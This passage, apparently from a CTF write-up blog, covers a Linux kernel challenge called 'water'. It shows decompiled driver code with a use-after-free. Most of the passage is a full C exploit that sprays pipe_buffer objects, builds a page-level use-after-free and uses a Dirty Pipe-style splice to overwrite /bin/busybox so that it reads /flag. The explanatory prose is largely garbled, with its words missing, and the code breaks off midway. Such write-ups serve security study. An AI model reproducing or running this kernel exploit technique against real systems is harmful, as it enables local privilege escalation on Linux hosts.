class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">water_ioctl</span><span class="params">(file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  __int64 arg_; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  edit_args args; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v8 = v3;</span><br><span class="line">  v7 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">copy_from_user</span>(&amp;args, arg_, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( delete_idx &lt;= <span class="number">0</span> &amp;&amp; chunk )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">kfree</span>();                              <span class="comment">// uaf dangling pointer</span></span><br><span class="line">                                                <span class="comment">// chunk = 0</span></span><br><span class="line">          ++delete_idx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x50</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">copy_from_user</span>(&amp;args, arg_, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( edit_idx &lt;= <span class="number">0</span> &amp;&amp; chunk &amp;&amp; !<span class="built_in">copy_from_user</span>(chunk, args.buf, <span class="number">1LL</span>) )<span class="comment">// pipe pages</span></span><br><span class="line">        &#123;</span><br><span class="line">          ++edit_idx;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x20</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">copy_from_user</span>(&amp;args, arg_, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !chunk )</span><br><span class="line">        &#123;                                       <span class="comment">// void *kmalloc_trace(struct kmem_cache *s, gfp_t flags, size_t size)</span></span><br><span class="line">          chunk = (<span class="type">unsigned</span> __int8 *)<span class="built_in">kmalloc_trace</span>(kmalloc_caches[<span class="number">51</span>], <span class="number">4197568LL</span>, <span class="number">0x200</span>LL);</span><br><span class="line">          <span class="keyword">if</span> ( chunk )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">copy_from_user</span>(chunk, args.buf, <span class="number">0x200</span>LL);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>chunkflag <code>SLAB_ACCOUNT 0x04000000</code> slab</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk = (<span class="type">unsigned</span> __int8 *)<span class="built_in">kmalloc_trace</span>(kmalloc_caches[<span class="number">51</span>], <span class="number">0x400CC0</span>LL, <span class="number">0x200</span>LL);</span><br></pre></td></tr></table></figure><p> pipe  page </p><ul><li>fcntl  pipe size0x200 <code>pipe_bufs ring</code></li><li>uaf  <code>pipe_buffer-&gt;pages</code> page</li><li>free  page page</li><li></li><li>page kmalloc-640x40</li></ul><p>gdb</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># gdbscript</span><br><span class="line">file vmlinux  #  kaslr debug</span><br><span class="line">target remote :1234</span><br><span class="line"></span><br><span class="line"># cmd</span><br><span class="line">gdb -x gdbscript</span><br></pre></td></tr></table></figure><h3 id="page-level-uaf"><a href="#page-level-uaf" class="headerlink" title="page-level-uaf"></a>page-level-uaf</h3><p>pipe <code>struct pipe_inode_info (size ?= 0x88)</code>  <code>pipe-&gt;bufs</code>   10(pipe_bufs &amp;&amp; ring_size) <code>struct pipe_buffer</code>  <code>struct page *page</code></p><ul><li>pipe <code>pipe_fcntl</code>   <code>ring_size</code>   <code>pipe-&gt;bufs</code>  kmalloc-512</li><li> <code>pipe_bufs</code>  free  kmalloc-512</li><li>chunkfreekmalloc-512</li><li><code>fcntl</code>  <code>pipe_bufs</code>  kmalloc-512</li><li>pipe<code>alloc_pages</code> </li><li>uafedit page pipe victim, origin  struct page</li><li><code>struct page</code>  0x40 <code>\x00</code>  <code>75%</code>0x100 &#x2F; 0x40 &#x3D; 4</li></ul><p> close origin pipe  uaf  page</p><h3 id="-page-level-uaf-"><a href="#-page-level-uaf-" class="headerlink" title=" page-level-uaf "></a> page-level-uaf </h3><p>close uaf  page <code>pipe_buffer</code> close pipe</p><ul><li> pipe</li><li>close origin pipe free page 1</li><li>fcntl free page 1  pipe victim page 1pipe</li><li> free page 1 pipe_buffer   uaf  page 1  pipe_buffer  page </li><li>free page 1  pipe uaf  free page 2</li><li> pipe_buffer free page 2 pipe_buffer page  free page 1 pipe_buffer  page</li></ul><p>a3</p><p><img src="https://s2.loli.net/2023/05/02/TYr8WlEushem2i3.png" alt=""></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p> <code>struct pipe_buffer</code>   <code>offset &amp; len</code> </p><ul><li>offset len</li><li> offset + len </li></ul><p> 96  192  size</p><ul><li>kmalloc kmem_cache</li><li>size kmalloc 2size</li></ul><p>kfree sizepage  slab page  pageslab page  object </p><h4 id="pipe-primitive"><a href="#pipe-primitive" class="headerlink" title="pipe primitive"></a>pipe primitive</h4><p>dirty pipe  <code>struct pipe_buffer</code>  flag  <code>PIPE_BUF_FLAG_CAN_MERGE</code>  <code>splice</code> 0<strong></strong></p><p>pipeflag</p><p> <code>/bin/busybox</code> shellcode  bash  busybox  link</p><ul><li>shell <code>/bin/cat /flag</code> busybox <code>Too many levels of symbolic links</code> </li><li></li><li></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * musl-gcc water.c -static -masm=intel -o exp</span></span><br><span class="line"><span class="comment"> * strip exp</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SPRAY_NUMS 120</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_SPRAY_NUMS 80</span></span><br><span class="line"><span class="comment">// kmalloc-cg-96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_BUFS_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_BUF_FLAG_CAN_MERGE 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(fmt, ...) \</span></span><br><span class="line"><span class="meta">  dprintf(2, <span class="string">&quot;\033[32m[+] &quot;</span> fmt <span class="string">&quot;\033[0m\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">page</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_inode_info</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">page</span> *page;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> *ops;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> &#123;</span><br><span class="line">  <span class="built_in">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> spray_pipe_fd[PIPE_SPRAY_NUMS][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">int</span> victim_idx = <span class="number">-1</span>, origin_idx = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> target_file[] = <span class="string">&quot;/bin/busybox&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> payload[] = <span class="string">&quot;#!/tmp/sh\n /tmp/cat /flag\n&quot;</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> info_pipe_buf = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">water_args</span> &#123;</span><br><span class="line">  <span class="type">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">new_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">512</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0x44</span>, <span class="built_in">sizeof</span>(buffer));</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = buffer,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x20</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">delete_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = <span class="literal">NULL</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x30</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">edit_chunk</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = &amp;c,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x50</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[-] error: %s&quot;</span>, msg);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">5</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">debug</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(msg);</span><br><span class="line">  <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">page_level_uaf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;spray pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(spray_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;change ring_size make pipe-&gt;bufs kmalloc-512 &quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i ++) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;kmalloc-512 hole&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i += <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;new chunk then free&quot;</span>);</span><br><span class="line">  <span class="built_in">new_chunk</span>();</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;write chunk data D&quot;</span>);</span><br><span class="line">  <span class="built_in">delete_chunk</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;fill the hole&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i += <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;alloc pipe_buffer pages&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;uaf change pipe-&gt;bufs-&gt;page&quot;</span>);</span><br><span class="line">  <span class="built_in">edit_chunk</span>(<span class="number">0x00</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find victim pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="type">char</span> tags[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line">    <span class="built_in">memset</span>(tags, <span class="number">0</span>, <span class="built_in">sizeof</span>(tags));</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], tags, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(tags, <span class="string">&quot;deadbeef&quot;</span>) &amp;&amp; nr != i) &#123;</span><br><span class="line">      origin_idx = nr;</span><br><span class="line">      victim_idx = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;succeed find victim: %d, origin: %d&quot;</span>, victim_idx, origin_idx);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (victim_idx == <span class="number">-1</span> || origin_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;find idx&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipe_primitive</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x400</span>];</span><br><span class="line">  <span class="type">int</span> snd_pipe_fd[SND_PIPE_SPRAY_NUMS][<span class="number">2</span>];</span><br><span class="line">  <span class="type">int</span> target_fd;</span><br><span class="line">  <span class="type">size_t</span> snd_pipe_sz;</span><br><span class="line">  <span class="keyword">if</span> ((target_fd = <span class="built_in">open</span>(target_file, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /bin/busybox&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUFS_SIZE / <span class="built_in">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SND_PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(snd_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write pipe then we can read&quot;</span>);</span><br><span class="line">  <span class="comment">// ? find victim  3    3 sizeof(int) </span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], buffer, SND_PIPE_BUFS_SIZE * <span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span> * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;free origin pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;fcntl to set the pipe in victim page&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SND_PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fcntl</span>(snd_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;failed to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">loff_t</span> offset = <span class="number">1</span>;</span><br><span class="line">    <span class="type">ssize_t</span> nbytes = <span class="built_in">splice</span>(target_fd, &amp;offset, snd_pipe_fd[i][<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) <span class="built_in">err_exit</span>(<span class="string">&quot;splice() error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ? find victim_idx  tag  idx </span></span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], buffer, SND_PIPE_BUFS_SIZE - <span class="number">8</span> - <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">size_t</span>)info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span> ||</span><br><span class="line">      (<span class="type">size_t</span>)info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span 